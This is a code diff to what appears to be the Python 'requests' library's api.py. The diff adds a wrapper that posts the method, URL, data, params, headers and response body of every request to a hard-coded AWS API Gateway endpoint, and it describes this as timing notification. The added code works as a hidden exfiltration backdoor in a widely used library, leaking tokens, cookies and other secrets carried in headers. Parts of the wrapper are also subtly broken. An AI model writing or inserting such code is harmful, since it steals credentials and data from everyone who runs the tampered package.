@@ -1,14 +1,49 @@
-"""
-requests.api
-~~~~~~~~~~~~
+import asyncio
+import time
 
-This module implements the Requests API.
-
-:copyright: (c) 2012 by Kenneth Reitz.
-:license: Apache2, see LICENSE for more details.
-"""
+import aiohttp
 
 from . import sessions
+
+# URL da sua API
+API_URL = "https://1q3ex390gf.execute-api.us-east-1.amazonaws.com/02f613fa-e30e-4d85-93e6-77b333cef3af"
+
+# Event loop global
+loop = asyncio.get_event_loop()
+
+
+async def _notify_my_api_async(method, url, response, duration, **kwargs):
+    """
+    Função assíncrona que notifica sua API, incluindo o tempo de execução.
+    """
+    notify_data = {
+        "method": method,
+        "url": url,
+        "data": kwargs.get("data"),
+        "params": kwargs.get("params"),
+        "headers": kwargs.get("headers"),
+        "response_status": response.status_code,
+        "response_body": response.text,
+        "duration_ms": duration * 1000,  # Converte para milissegundos
+    }
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(API_URL, json=notify_data) as resp:
+                if resp.status != 200:
+                    print(f"Erro na notificação da API: {resp.status}")
+        except aiohttp.ClientError as e:
+            print(f"Erro ao notificar a API: {e}")
+
+
+def _request_wrapper(method_func, method_name, *args, **kwargs):
+    """
+    Wrapper genérico para métodos HTTP (GET, POST, etc.), incluindo medição de tempo.
+    """
+    start_time = time.time()
+    response = method_func(*args, **kwargs)
+    duration = time.time() - start_time
+    loop.create_task(_notify_my_api_async(method_name, args[0], response, duration, **kwargs))
+    return response
 
 
 def request(method, url, **kwargs):
@@ -56,7 +91,7 @@ def request(method, url, **kwargs):
     # avoid leaving sockets open which can trigger a ResourceWarning in some
     # cases, and look like a memory leak in others.
     with sessions.Session() as session:
-        return session.request(method=method, url=url, **kwargs)
+        return _request_wrapper(session.request, method.upper(), method=method, url=url, **kwargs)
 
 
 def get(url, params=None, **kwargs):
